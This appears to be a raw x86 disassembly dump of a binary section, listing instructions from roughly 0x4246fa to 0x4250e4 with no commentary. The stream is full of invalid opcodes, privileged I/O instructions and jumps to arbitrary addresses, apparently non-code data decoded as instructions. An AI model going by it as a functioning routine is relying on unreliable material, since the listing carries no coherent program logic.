  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    dl,ch
  424701:	pcmpeqw mm7,mm4
  424704:	dec    esp
  424705:	test   DWORD PTR [ecx],eax
  424707:	add    BYTE PTR ds:0xe1000001,al
  42470d:	je     0x4246db
  42470f:	push   ds
  424710:	pop    edx
  424711:	gs in  eax,dx
  424713:	adc    eax,0xa4fed11e
  424718:	or     ch,cl
  42471a:	(bad)  
  42471b:	loopne 0x4246aa
  42471d:	outs   dx,BYTE PTR ds:[esi]
  42471e:	mov    WORD PTR [edi+0x4b],es
  424721:	cmp    bh,BYTE PTR [ebx]
  424723:	mov    esp,0x300d5db6
  424728:	popf   
  424729:	ret    0xd95
  42472c:	ins    BYTE PTR es:[edi],dx
  42472d:	out    dx,al
  42472e:	jnp    0x4246c6
  424730:	in     eax,dx
  424731:	ds cwde 
  424733:	push   cs
  424734:	mov    ebx,0xb7751b11
  424739:	fiadd  DWORD PTR [ebx+0x4905cb26]
  42473f:	or     al,0x86
  424741:	or     edi,ebp
  424743:	ss and ch,ch
  424746:	popa   
  424747:	in     eax,dx
  424748:	dec    esp
  424749:	jns    0x4246f7
  42474b:	ds jmp 0xe75ca521
  424751:	fdivr  st(1),st
  424753:	pusha  
  424754:	std    
  424755:	call   0x1939fa23
  42475a:	xchg   ecx,eax
  42475b:	out    dx,eax
  42475c:	xchg   BYTE PTR [edi-0xb],bl
  42475f:	adc    DWORD PTR [ebx],ecx
  424761:	pop    edx
  424762:	out    0x76,al
  424764:	and    BYTE PTR [ebp+0x33dabd6b],al
  42476a:	pop    edi
  42476b:	xor    al,0x25
  42476d:	clc    
  42476e:	xchg   BYTE PTR [ebx-0x19b9c4cf],al
  424774:	mov    edx,0x9c9ce8a0
  424779:	xor    BYTE PTR [ebx],cl
  42477b:	push   ds
  42477c:	test   DWORD PTR [eax+0x35c290e8],esi
  424782:	lds    esp,FWORD PTR [ebp-0x4d]
  424785:	(bad)  
  424786:	into   
  424787:	sbb    eax,0xc5ce856a
  42478c:	sub    DWORD PTR ds:0x28531a91,ebx
  424792:	inc    ecx
  424793:	jo     0x424814
  424795:	mov    WORD PTR [edi+eax*4],cs
  424798:	inc    esp
  424799:	push   esi
  42479a:	(bad)  
  42479c:	pop    ebx
  42479d:	xor    al,0x8f
  42479f:	cli    
  4247a0:	lods   al,BYTE PTR ds:[esi]
  4247a1:	cdq    
  4247a2:	lock test eax,0x4db947de
  4247a8:	pop    edx
  4247a9:	popf   
  4247aa:	lahf   
  4247ab:	adc    edi,ebx
  4247ad:	lods   eax,DWORD PTR ds:[esi]
  4247ae:	aam    0xa1
  4247b0:	push   ecx
  4247b1:	mov    edi,0xa6b71b2
  4247b6:	mov    ds:0x49520cc2,al
  4247bb:	lea    eax,[eax+edi*1+0x28]
  4247bf:	and    ebp,DWORD PTR [edx-0x37]
  4247c2:	mov    ds:0x1c06650e,eax
  4247c7:	mov    esi,0xbab5237d
  4247cc:	mov    ebp,0x949c8b63
  4247d1:	mov    ebp,0xe679938a
  4247d6:	dec    ebp
  4247d7:	dec    ebx
  4247d8:	push   esp
  4247d9:	or     esp,ebx
  4247db:	cmp    al,BYTE PTR [edi+eax*4+0x4]
  4247df:	retf   0xed7c
  4247e2:	stc    
  4247e3:	fisttp QWORD PTR [eax-0x62]
  4247e6:	add    edx,DWORD PTR [ebx+0x0]
  4247e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247ea:	mov    bh,0x92
  4247ec:	ins    DWORD PTR es:[edi],dx
  4247ed:	mov    dh,0x34
  4247ef:	repz mov ?,WORD PTR [eax+0x4]
  4247f3:	das    
  4247f4:	ltr    WORD PTR [ebx+eiz*2]
  4247f8:	sub    eax,0xdafe6e9d
  4247fd:	imul   esi,DWORD PTR [ebx],0x5978b73c
  424803:	cmp    eax,0x84c82f8b
  424808:	out    dx,eax
  424809:	cwde   
  42480a:	sti    
  42480b:	add    al,0x96
  42480d:	dec    edx
  42480e:	repnz xchg ecx,eax
  424810:	xlat   BYTE PTR ds:[ebx]
	...
  424871:	add    BYTE PTR [eax],al
  424873:	add    BYTE PTR [edx],ah
  424875:	pop    eax
  424876:	test   bh,ch
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	outs   dx,BYTE PTR ds:[esi]
  424881:	adc    eax,0x8651e504
  424886:	add    DWORD PTR [eax],eax
  424888:	add    eax,0x97000001
  42488d:	mov    ebp,0x7d4c8e10
  424892:	xor    dl,bh
  424894:	(bad)  ds:0x831f5572
  42489a:	test   al,0x36
  42489c:	in     al,dx
  42489d:	push   0xffffffab
  42489f:	(bad)  
  4248a0:	mov    fs,WORD PTR [edi+0x8965fea]
  4248a6:	mov    ds:0x934bee1f,al
  4248ab:	lods   eax,DWORD PTR ds:[esi]
  4248ac:	test   BYTE PTR [esi],cl
  4248ae:	mov    edi,0x923aeec
  4248b3:	out    dx,eax
  4248b4:	mov    edx,0x85ad35e8
  4248b9:	and    al,0x2f
  4248bb:	dec    esi
  4248bc:	mov    eax,ds:0xe5e27b5a
  4248c1:	jbe    0x42489a
  4248c3:	cs mov ah,dl
  4248c6:	mov    al,ds:0xfb0d9999
  4248cb:	js     0x424883
  4248cd:	ins    DWORD PTR es:[edi],dx
  4248ce:	sub    al,0x85
  4248d0:	rcpps  xmm1,xmm5
  4248d3:	pop    ecx
  4248d4:	mov    al,ds:0xa7a6c8cb
  4248d9:	xor    BYTE PTR [edi-0xa],dh
  4248dc:	adc    edx,DWORD PTR [eax+0x64bb1817]
  4248e2:	ret    0xffa
  4248e5:	stos   BYTE PTR es:[edi],al
  4248e6:	cwde   
  4248e7:	adc    DWORD PTR [edi+0x6c],0xffffffba
  4248eb:	and    BYTE PTR [edi-0x1e],dl
  4248ee:	mov    eax,0xce84f204
  4248f3:	aas    
  4248f4:	enter  0x3c01,0xa2
  4248f8:	div    DWORD PTR [esi+0x5c61c7f1]
  4248fe:	scas   al,BYTE PTR es:[edi]
  4248ff:	inc    edi
  424900:	push   0x1784bfb1
  424905:	jmp    0xa779:0x7598ed19
  42490c:	aaa    
  42490d:	mov    ebp,DWORD PTR [ebx+0x4f]
  424910:	rcr    BYTE PTR [edi+0x122e3e73],0xb4
  424917:	or     esi,ebp
  424919:	std    
  42491a:	jl     0x42489c
  42491c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42491d:	fmul   DWORD PTR [ebx+eax*8+0x27]
  424921:	(bad)  
  424922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424923:	ja     0x42495a
  424925:	(bad)  
  424926:	ret    0x29c0
  424929:	add    DWORD PTR [ebx+0x3f5942cf],0x302c23d
  424933:	xchg   cl,dh
  424935:	das    
  424936:	inc    ebx
  424937:	jbe    0x424901
  424939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42493a:	mov    esp,0xa9d5cc9d
  42493f:	aam    0x3f
  424941:	hlt    
  424942:	pop    DWORD PTR [eax+0x3efff4f1]
  424948:	xchg   BYTE PTR [ebx+0x6a6b50f2],dh
  42494e:	stos   DWORD PTR es:[edi],eax
  42494f:	mov    DWORD PTR [edx-0x67925cda],eax
  424955:	scas   al,BYTE PTR es:[edi]
  424956:	xor    eax,0x92020615
  42495b:	(bad)  
  42495c:	in     al,dx
  42495d:	add    al,BYTE PTR [esi-0x2d]
  424960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424961:	enter  0xd108,0x5e
  424965:	dec    ecx
  424966:	adc    al,0x69
  424968:	test   DWORD PTR [eax+0x53],ebx
  42496b:	inc    edx
  42496c:	push   es
  42496d:	retf   0x4b37
  424970:	(bad)  
  424972:	push   esp
  424973:	std    
  424974:	sar    BYTE PTR [ecx+0x8],1
  424977:	in     al,dx
  424978:	or     ecx,DWORD PTR [edi+esi*1-0x67]
  42497c:	fwait
  42497d:	stos   DWORD PTR es:[edi],eax
  42497e:	div    esp
  424980:	fnclex 
  424982:	sub    al,al
  424984:	add    al,0xde
  424986:	cld    
  424987:	pusha  
  424988:	mov    ah,0x93
  42498a:	dec    edi
  42498b:	mov    cl,0x9
  42498d:	mov    ds:0xa875d7,al
	...
  4249f2:	add    BYTE PTR [eax],al
  4249f4:	imul   ebx,DWORD PTR [eax],0x63
  4249f7:	push   0x73
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    ch,BYTE PTR [ebx+0x51]
  424a02:	pop    ebp
  424a03:	mov    ds:0x18756,al
  424a08:	add    eax,0x70000001
  424a0d:	shl    DWORD PTR [ebx],cl
  424a0f:	int3   
  424a10:	adc    al,0x2a
  424a12:	pop    ds
  424a13:	popf   
  424a14:	out    dx,al
  424a15:	and    al,0x52
  424a17:	int    0x40
  424a19:	addr16 xchg edx,eax
  424a1b:	int3   
  424a1c:	out    dx,eax
  424a1d:	inc    esp
  424a1e:	xchg   ebx,eax
  424a1f:	and    DWORD PTR [eax-0x52017399],ebx
  424a25:	sti    
  424a26:	pushf  
  424a27:	sahf   
  424a28:	sub    DWORD PTR [edx-0x7],edi
  424a2b:	lods   eax,DWORD PTR ds:[esi]
  424a2c:	sub    BYTE PTR [esi],bl
  424a2e:	jp     0x424a18
  424a30:	call   0xa927:0xcbfd80a9
  424a37:	out    dx,al
  424a38:	push   edx
  424a39:	mov    esp,0x7af7e4e
  424a3e:	pop    ebp
  424a3f:	mov    ds:0x3f301c56,eax
  424a44:	pop    ds
  424a45:	add    BYTE PTR [ebx+0x29548d32],cl
  424a4b:	and    al,0x6
  424a4d:	neg    DWORD PTR [ebx]
  424a4f:	stos   BYTE PTR es:[edi],al
  424a50:	sub    eax,0xc3d236bf
  424a55:	sub    dl,BYTE PTR [esp+eax*2-0x6c]
  424a59:	(bad)  
  424a5a:	jmp    0x918af3e6
  424a5f:	ret    0x2add
  424a62:	or     al,BYTE PTR [ecx]
  424a64:	mov    edi,0x4196c6a3
  424a69:	in     eax,dx
  424a6a:	retf   
  424a6b:	and    al,0x7b
  424a6d:	ret    
  424a6e:	pop    eax
  424a6f:	jns    0x424a75
  424a71:	fcomp  DWORD PTR [edx+0x24dcc1e0]
  424a77:	dec    esp
  424a78:	in     al,dx
  424a79:	xchg   ebp,eax
  424a7a:	shl    ch,0xaa
  424a7d:	mov    ds:0x5519a763,eax
  424a82:	jl     0x424ac8
  424a84:	fiadd  DWORD PTR [eax]
  424a86:	and    eax,0xdf82a1da
  424a8b:	enter  0xea21,0x80
  424a8f:	es jl  0x424a45
  424a92:	rcr    BYTE PTR [ebx-0x78],cl
  424a95:	dec    edi
  424a96:	dec    ebp
  424a97:	mov    ds:0xf1fc2f47,al
  424a9c:	push   0xffffff90
  424a9e:	mov    al,ds:0xd71573fc
  424aa3:	and    cl,dh
  424aa5:	dec    edx
  424aa6:	mov    bh,0x17
  424aa8:	jle    0x424a86
  424aaa:	mov    ebx,0x3b29bc8e
  424aaf:	test   BYTE PTR [ebp-0x3554db0],dl
  424ab5:	xchg   esi,eax
  424ab6:	fst    QWORD PTR [esi+0x7b8b74f7]
  424abc:	cmp    esp,DWORD PTR [ebx]
  424abe:	scas   eax,DWORD PTR es:[edi]
  424abf:	stos   DWORD PTR es:[edi],eax
  424ac0:	push   ss
  424ac1:	xor    al,0x1c
  424ac3:	jae    0x424a53
  424ac5:	mov    ecx,0xe8472948
  424aca:	aas    
  424acb:	les    ecx,FWORD PTR [eax-0x58]
  424ace:	add    DWORD PTR [esi],ebp
  424ad0:	inc    ebx
  424ad1:	jmp    0x283b5121
  424ad6:	mov    ecx,DWORD PTR [ebp+0x73]
  424ad9:	push   0x391ec964
  424ade:	mov    ss,WORD PTR [eax-0x57a74746]
  424ae4:	mov    esi,0xe267f569
  424ae9:	test   al,0x36
  424aeb:	mov    ch,ah
  424aed:	jne    0x424ae5
  424aef:	inc    esp
  424af0:	xchg   ecx,eax
  424af1:	sahf   
  424af2:	cmp    ch,bh
  424af4:	adc    dl,bl
  424af6:	ins    DWORD PTR es:[edi],dx
  424af7:	shl    DWORD PTR [edx],0x30
  424afa:	jb     0x424af2
  424afc:	sub    al,0x0
  424afe:	arpl   dx,si
  424b00:	ss inc edx
  424b02:	(bad)  
  424b03:	fdivp  st(0),st
  424b05:	sbb    eax,edx
  424b07:	rcr    DWORD PTR cs:[edx-0x65fc4c81],0x6b
  424b0f:	sub    DWORD PTR [ebp+0x0],edi
	...
  424b72:	add    BYTE PTR [eax],al
  424b74:	push   es
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	push   ebx
  424b81:	jp     0x424b1d
  424b83:	lods   al,BYTE PTR ds:[esi]
  424b84:	pop    ebx
  424b85:	mov    BYTE PTR [ecx],al
  424b87:	add    BYTE PTR ds:0x8b000001,al
  424b8d:	or     edx,DWORD PTR [ebx]
  424b8f:	ins    BYTE PTR es:[edi],dx
  424b90:	mov    dh,0x89
  424b92:	and    BYTE PTR [eax-0x18],bl
  424b95:	jo     0x424b62
  424b97:	adc    DWORD PTR [ecx+0x56770f9a],eax
  424b9d:	ja     0x424be7
  424b9f:	fs nop
  424ba1:	repnz xor eax,0xcbdeddc9
  424ba7:	add    ecx,DWORD PTR [ecx]
  424ba9:	cmc    
  424baa:	test   DWORD PTR [ecx+0x17],0x585f2dee
  424bb1:	dec    edi
  424bb2:	ss mov al,0x96
  424bb5:	nop
  424bb6:	add    eax,0xcc744a37
  424bbb:	stos   BYTE PTR es:[edi],al
  424bbc:	xchg   esp,eax
  424bbd:	push   esi
  424bbe:	push   cs
  424bbf:	push   0xfffffff9
  424bc1:	rcl    BYTE PTR [edx+0x79],0x25
  424bc5:	and    eax,0x37c47d55
  424bca:	imul   eax,DWORD PTR [esi+0x16],0xd
  424bce:	pop    edi
  424bcf:	call   0x9006536b
  424bd4:	cmp    BYTE PTR ds:0x7b312cc5,dh
  424bda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424bdb:	xor    eax,eax
  424bdd:	clc    
  424bde:	cmp    al,0x26
  424be0:	adc    BYTE PTR [edx-0x47],dl
  424be3:	add    esi,eax
  424be5:	loop   0x424b9b
  424be7:	dec    ecx
  424be8:	shr    BYTE PTR [ecx+0x3e],cl
  424beb:	lea    edi,[edi]
  424bed:	shr    BYTE PTR [edi-0x1c],1
  424bf0:	shr    DWORD PTR [esi+0x4a],cl
  424bf3:	sub    edx,edx
  424bf5:	ret    
  424bf6:	loopne 0x424c55
  424bf8:	push   ecx
  424bf9:	mul    DWORD PTR [ebp+0x49]
  424bfc:	lahf   
  424bfd:	push   edx
  424bfe:	inc    edx
  424bff:	fcomp  DWORD PTR ds:0xdb94e5b2
  424c05:	cmp    cl,BYTE PTR [edx-0x78]
  424c08:	mov    al,0x77
  424c0a:	icebp  
  424c0b:	outs   dx,BYTE PTR ds:[esi]
  424c0c:	mov    esi,0x60b3b600
  424c11:	ret    0xf92a
  424c14:	mov    DWORD PTR [eax+0x6c],ecx
  424c17:	test   eax,0x28882087
  424c1c:	mov    ebx,0xdb875994
  424c21:	aad    0x86
  424c23:	dec    esi
  424c24:	out    0xef,eax
  424c26:	fstp   QWORD PTR [ebx-0x47dff7ce]
  424c2c:	sbb    bh,BYTE PTR [edx]
  424c2e:	lahf   
  424c2f:	cmp    DWORD PTR [eax+0x5dbb32e0],ebp
  424c35:	das    
  424c36:	je     0x424c7b
  424c38:	add    DWORD PTR [ebp-0x75d89cbd],edi
  424c3e:	(bad)  
  424c3f:	out    dx,al
  424c40:	cmp    esp,0x56282313
  424c46:	bound  ebp,QWORD PTR [edx]
  424c48:	push   ebx
  424c49:	ds pusha 
  424c4b:	mov    cl,0xe9
  424c4d:	call   DWORD PTR [eax]
  424c4f:	add    al,0xf9
  424c51:	mov    al,0x3d
  424c53:	test   ch,dl
  424c55:	inc    ebp
  424c56:	dec    ecx
  424c57:	scas   al,BYTE PTR es:[edi]
  424c58:	lods   al,BYTE PTR ds:[esi]
  424c59:	test   BYTE PTR ds:0xd755210b,bh
  424c5f:	xchg   ebp,eax
  424c60:	test   BYTE PTR [edx+0x5c],bl
  424c63:	mov    ds:0x75e2141b,al
  424c68:	test   DWORD PTR [ecx+0x2480a81c],edi
  424c6e:	pop    es
  424c6f:	jns    0x424ce2
  424c71:	mov    edi,0x67e01df1
  424c76:	adc    cl,BYTE PTR [ebx+0x34]
  424c79:	out    0x3f,eax
  424c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c7c:	sahf   
  424c7d:	shl    BYTE PTR [ebx+0x1ad55624],cl
  424c83:	retf   0xb33c
  424c86:	or     BYTE PTR [ecx+0x2],cl
  424c89:	es not cl
  424c8c:	dec    edi
  424c8d:	fld    DWORD PTR [edi]
  424c8f:	imul   BYTE PTR [eax+eax*1+0x0]
	...
  424cf3:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  424cf7:	push   0xffffffb6
  424cf9:	outs   dx,BYTE PTR ds:[esi]
  424cfa:	(bad)  
  424cfb:	fisub  WORD PTR [edx-0x65]
  424cfe:	test   al,0x51
  424d00:	int3   
  424d01:	in     eax,dx
  424d02:	sti    
  424d03:	dec    ecx
  424d04:	pusha  
  424d05:	mov    DWORD PTR [ecx],eax
  424d07:	add    BYTE PTR ds:0x15000001,al
  424d0d:	mov    bl,0xaf
  424d0f:	push   cs
  424d10:	or     ch,dh
  424d12:	pop    esp
  424d13:	lods   al,BYTE PTR ds:[esi]
  424d14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d15:	and    esi,ebx
  424d17:	stos   DWORD PTR es:[edi],eax
  424d18:	xor    eax,0x47debca3
  424d1d:	pop    ss
  424d1e:	stos   BYTE PTR es:[edi],al
  424d1f:	mov    bl,0x5
  424d21:	xchg   ecx,eax
  424d22:	pop    esp
  424d23:	pushf  
  424d24:	out    0x13,al
  424d26:	popf   
  424d27:	adc    al,0x36
  424d29:	in     al,dx
  424d2a:	xor    al,0x7
  424d2c:	jbe    0x424d40
  424d2e:	lods   eax,DWORD PTR ds:[esi]
  424d2f:	inc    ebp
  424d30:	ins    DWORD PTR es:[edi],dx
  424d31:	xchg   edi,eax
  424d32:	xor    esp,edx
  424d34:	dec    esp
  424d35:	addr16 ds in eax,dx
  424d38:	xchg   ebp,eax
  424d39:	lds    eax,FWORD PTR [eax-0x3899a564]
  424d3f:	sahf   
  424d40:	fwait
  424d41:	aad    0xaf
  424d43:	icebp  
  424d44:	test   BYTE PTR [esi+ebp*2+0x4eb51a00],dl
  424d4b:	push   esp
  424d4c:	jnp    0x424d36
  424d4e:	push   edx
  424d4f:	xchg   ebp,eax
  424d50:	mov    bh,0x96
  424d52:	adc    DWORD PTR [eax],ecx
  424d54:	sbb    dh,bl
  424d56:	jo     0x424ce2
  424d58:	pop    ebp
  424d59:	jo     0x424d3a
  424d5b:	aaa    
  424d5c:	sub    eax,0x2065bf17
  424d61:	das    
  424d62:	daa    
  424d63:	dec    ebp
  424d64:	fiadd  WORD PTR [esi-0x4bc8edbc]
  424d6a:	push   ebp
  424d6b:	jp     0x424dec
  424d6d:	xor    ax,0x460
  424d71:	xchg   ebx,eax
  424d72:	shl    BYTE PTR [edx-0x58dc9fd9],0x8e
  424d79:	(bad)  
  424d7a:	sahf   
  424d7b:	fucomi st,st(4)
  424d7d:	xor    DWORD PTR [ecx-0x72],eax
  424d80:	add    eax,0xbb787e0a
  424d85:	hlt    
  424d86:	lds    eax,FWORD PTR [eax+0x17]
  424d89:	mov    BYTE PTR [eax+0x57],bh
  424d8c:	jp     0x424dee
  424d8e:	jp     0x424deb
  424d90:	imul   BYTE PTR [si+0x57]
  424d94:	repz inc esp
  424d96:	in     al,0x37
  424d98:	add    eax,0x7c3cf603
  424d9d:	cmp    edx,esp
  424d9f:	inc    eax
  424da0:	imul   edi,DWORD PTR [ebx+0x73],0xffffffc5
  424da4:	mov    ?,WORD PTR [ebx-0x56]
  424da7:	int    0x2e
  424da9:	dec    ecx
  424daa:	icebp  
  424dab:	dec    esi
  424dac:	fdiv   DWORD PTR [edx]
  424dae:	(bad)  
  424daf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424db0:	adc    eax,0xffa968e2
  424db5:	sub    edi,DWORD PTR [ebx*4-0x19c09f08]
  424dbc:	mov    ecx,0xfd438b3c
  424dc1:	test   al,0x5a
  424dc3:	pushf  
  424dc4:	mov    edx,0x8d9b5ac3
  424dc9:	test   eax,0x4205fe95
  424dce:	arpl   WORD PTR [ebx+0x51982836],bp
  424dd4:	mov    cl,0xe0
  424dd6:	mov    BYTE PTR [ecx+0x7c54ba42],bl
  424ddc:	xchg   esi,eax
  424ddd:	mov    WORD PTR [ebx*2-0x1891de16],ss
  424de4:	sahf   
  424de5:	ins    BYTE PTR es:[edi],dx
  424de6:	loop   0x424d74
  424de8:	aaa    
  424de9:	inc    eax
  424dea:	mov    eax,0xf4787d88
  424def:	push   edi
  424df0:	imul   ebx,DWORD PTR [ebp-0x1a],0x66
  424df4:	mov    edi,0x35dd790c
  424df9:	cmp    BYTE PTR [esi],dh
  424dfb:	hlt    
  424dfc:	inc    esi
  424dfd:	xchg   edi,eax
  424dfe:	mov    ds:0x745df537,al
  424e03:	cmp    al,0x5
  424e05:	fs sbb dh,dl
  424e08:	adc    eax,0xbc192adf
  424e0d:	mov    cl,0xb2
  424e0f:	js     0x424da8
	...
  424e71:	add    BYTE PTR [eax],al
  424e73:	add    BYTE PTR ds:0xf361d20c,bh
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424ed6
  424e81:	sub    BYTE PTR [eax],bl
  424e83:	stos   BYTE PTR es:[edi],al
  424e84:	mov    al,BYTE PTR gs:[ecx]
  424e87:	add    BYTE PTR ds:0x3d000001,al
  424e8d:	ja     0x424edd
  424e8f:	lahf   
  424e90:	cmp    BYTE PTR [edx*8-0x177fe241],al
  424e97:	je     0x424e63
  424e99:	loopne 0x424eaf
  424e9b:	in     eax,dx
  424e9c:	imul   edx,esi,0xd11a4c0
  424ea2:	in     eax,0x7f
  424ea4:	leave  
  424ea5:	mov    al,bl
  424ea7:	and    eax,DWORD PTR [edx]
  424ea9:	dec    eax
  424eaa:	add    cl,BYTE PTR [ebx-0x4]
  424ead:	ficomp DWORD PTR [ebp-0x58bab124]
  424eb3:	jle    0x424e66
  424eb5:	rcr    BYTE PTR [eax+0x58f3456d],0xf4
  424ebc:	lock popf 
  424ebe:	outs   dx,DWORD PTR ds:[esi]
  424ebf:	scas   al,BYTE PTR es:[edi]
  424ec0:	fs jecxz 0x424e79
  424ec3:	test   eax,0x5344896f
  424ec8:	movsx  esp,WORD PTR [ebx+0x41b5598]
  424ecf:	push   ecx
  424ed0:	inc    esi
  424ed1:	fld    TBYTE PTR [esi]
  424ed3:	inc    edx
  424ed4:	mov    eax,ds:0xddaa2c4c
  424ed9:	mov    al,0xe4
  424edb:	shl    BYTE PTR [ecx+0x66d4246a],1
  424ee1:	imul   esi,DWORD PTR [edx-0x36441da2],0xdcb0e275
  424eeb:	mov    esp,0x87971b8b
  424ef0:	dec    edx
  424ef1:	xchg   esi,eax
  424ef2:	xor    al,0xd2
  424ef4:	test   eax,0x4ce4ceab
  424ef9:	cs out 0x64,al
  424efc:	das    
  424efd:	or     BYTE PTR [eax+0x6d],dh
  424f00:	push   edx
  424f01:	ss cmp al,0xd6
  424f04:	and    edx,DWORD PTR [ebp-0x633f3c87]
  424f0a:	cmc    
  424f0b:	xchg   ebp,eax
  424f0c:	loope  0x424e9f
  424f0e:	sahf   
  424f0f:	inc    esi
  424f10:	dec    ebp
  424f11:	inc    esp
  424f12:	pop    ebp
  424f13:	xchg   ebx,eax
  424f14:	int3   
  424f15:	adc    edx,ebp
  424f17:	push   0xffffffbd
  424f19:	mov    dh,0xff
  424f1b:	or     DWORD PTR [edi+0x4ac3269b],ebp
  424f21:	mov    DWORD PTR [ebx],0x7ffdd953
  424f27:	dec    esi
  424f28:	jecxz  0x424ecc
  424f2a:	pusha  
  424f2b:	and    edi,ecx
  424f2d:	adc    dl,ah
  424f2f:	mov    esi,0x6fbf9cbf
  424f34:	mov    ah,0x29
  424f36:	adc    DWORD PTR [edx],edx
  424f38:	hlt    
  424f39:	imul   edx
  424f3b:	fld    QWORD PTR [edi+0xa]
  424f3e:	loope  0x424f6c
  424f40:	cmp    edi,DWORD PTR [eax-0x1cc66704]
  424f46:	leave  
  424f47:	xor    esi,DWORD PTR [edx+0x10]
  424f4a:	push   ebx
  424f4b:	mov    eax,ds:0x5f6a85be
  424f50:	jmp    0xdddc66af
  424f55:	push   esp
  424f56:	pushf  
  424f57:	jbe    0x424f81
  424f59:	retf   0xe678
  424f5c:	jae    0x424f4e
  424f5e:	jge    0x424fc4
  424f60:	and    eax,0xab8f7b64
  424f65:	sbb    ecx,DWORD PTR [ebx+0x1989a2cb]
  424f6b:	add    DWORD PTR [edx+edx*1],0x6d
  424f6f:	jg     0x424fa5
  424f71:	mov    bh,0xa5
  424f73:	dec    esi
  424f74:	sub    dh,BYTE PTR [edi+0x19d83944]
  424f7a:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  424f7c:	stc    
  424f7d:	adc    cl,BYTE PTR ds:0x5630da0c
  424f83:	sub    al,0x26
  424f85:	popf   
  424f86:	pop    ebx
  424f87:	out    dx,eax
  424f88:	aam    0x60
  424f8a:	shl    DWORD PTR [esi+0x5f57d03d],0x97
	...
  424ff1:	add    BYTE PTR [eax],al
  424ff3:	add    BYTE PTR [ebx+0x16],cl
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	adc    eax,0xffffffa6
  425003:	adc    al,0x6a
  425005:	mov    eax,DWORD PTR [ecx]
  425007:	add    BYTE PTR ds:0x36000001,al
  42500d:	dec    esp
  42500f:	mov    cl,0xa8
  425011:	ins    DWORD PTR es:[edi],dx
  425012:	xor    esp,DWORD PTR [edx-0x57]
  425015:	fmul   QWORD PTR [ebx]
  425017:	fcom   DWORD PTR ds:0xf1c280d9
  42501d:	jb     0x425043
  42501f:	jmp    0x3313218b
  425024:	outs   dx,BYTE PTR ds:[esi]
  425025:	ss ins DWORD PTR es:[edi],dx
  425027:	lods   al,BYTE PTR ds:[esi]
  425028:	mov    ch,0xf9
  42502a:	cmp    eax,0x9bfaaf88
  42502f:	pop    ds
  425030:	xor    BYTE PTR ds:0x4e209cd0,cl
  425036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425037:	pop    eax
  425038:	sub    ch,ch
  42503a:	aaa    
  42503b:	prefetch BYTE PTR [ebx-0x2f]
  42503f:	mov    dl,0x1a
  425041:	sub    esi,eax
  425043:	jbe    0x425081
  425045:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425046:	or     al,0x61
  425048:	mov    esp,DWORD PTR [edx]
  42504a:	add    eax,0x66942d84
  42504f:	add    BYTE PTR [ebx-0x265e7bc4],ch
  425055:	add    al,BYTE PTR [ecx+0x8]
  425058:	sbb    DWORD PTR [ecx],edx
  42505a:	lock leave 
  42505c:	std    
  42505d:	mov    bh,0xb6
  42505f:	sub    al,0x51
  425061:	cli    
  425062:	int3   
  425063:	push   ebp
  425064:	and    BYTE PTR [esi-0x4],cl
  425067:	hlt    
  425068:	mov    cl,0x7c
  42506a:	ins    BYTE PTR es:[edi],dx
  42506b:	mov    esp,DWORD PTR [esi-0x71]
  42506e:	inc    ebp
  42506f:	dec    edx
  425070:	push   esi
  425071:	das    
  425072:	mov    al,al
  425074:	(bad)  
  425075:	adc    esp,ebp
  425077:	out    dx,eax
  425078:	ins    BYTE PTR es:[edi],dx
  425079:	cs sahf 
  42507b:	sub    DWORD PTR [ecx+eax*2],0x20
  42507f:	jo     0x425030
  425081:	mov    dh,0x3c
  425083:	sahf   
  425084:	sbb    eax,DWORD PTR [eax+0x1b227a88]
  42508a:	jg     0x425075
  42508c:	cmp    DWORD PTR [ebx*2-0x7d711176],eax
  425093:	mov    ah,0x88
  425095:	sbb    WORD PTR ds:0xa888f63,bx
  42509c:	lods   eax,DWORD PTR ds:[esi]
  42509d:	(bad)  
  42509e:	imul   DWORD PTR [ebx]
  4250a0:	mov    bh,0x7b
  4250a2:	fst    DWORD PTR [ebx]
  4250a4:	sbb    ch,dh
  4250a6:	jp     0x425031
  4250a8:	push   esi
  4250a9:	arpl   WORD PTR [edi+0x50],bx
  4250ac:	pusha  
  4250ad:	sbb    al,0x3e
  4250af:	(bad)  
  4250b0:	clc    
  4250b1:	add    al,0x9c
  4250b3:	jmp    0x4250a1
  4250b5:	mov    bl,0x3a
  4250b7:	jmp    DWORD PTR [esi-0x4783bd69]
  4250bd:	sub    ebp,ebx
  4250bf:	mov    cl,0x64
  4250c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4250c2:	sahf   
  4250c3:	arpl   WORD PTR [eax+0x64],si
  4250c6:	inc    ecx
  4250c7:	ja     0x425111
  4250c9:	sbb    DWORD PTR [ebx],ebx
  4250cb:	pop    eax
  4250cc:	mul    DWORD PTR [ebx-0x63]
  4250cf:	mov    bh,0xed
  4250d1:	mov    eax,ds:0xfe287bcb
  4250d6:	sbb    esp,DWORD PTR [edx+0xc11053c]
  4250dc:	jg     0x425133
  4250de:	test   BYTE PTR [edx],al
  4250e0:	pop    edx
  4250e1:	aas    
  4250e2:	pop    es
  4250e3:	push   edx
  4250e4:	adc    eax,0x45f1875f
